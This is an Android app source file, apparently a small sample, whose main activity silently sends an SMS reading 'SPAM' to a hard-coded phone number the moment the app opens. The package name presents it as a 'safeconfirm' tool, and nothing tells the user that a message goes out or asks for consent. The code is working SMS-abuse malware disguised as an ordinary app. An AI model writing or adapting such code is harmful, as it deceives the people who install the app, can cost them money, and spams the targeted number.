package com.hax3rzzz.safeconfirm;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.content.Intent;
import android.telephony.SmsManager;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage("7813011976", null, "SPAM", null, null);
    }
}
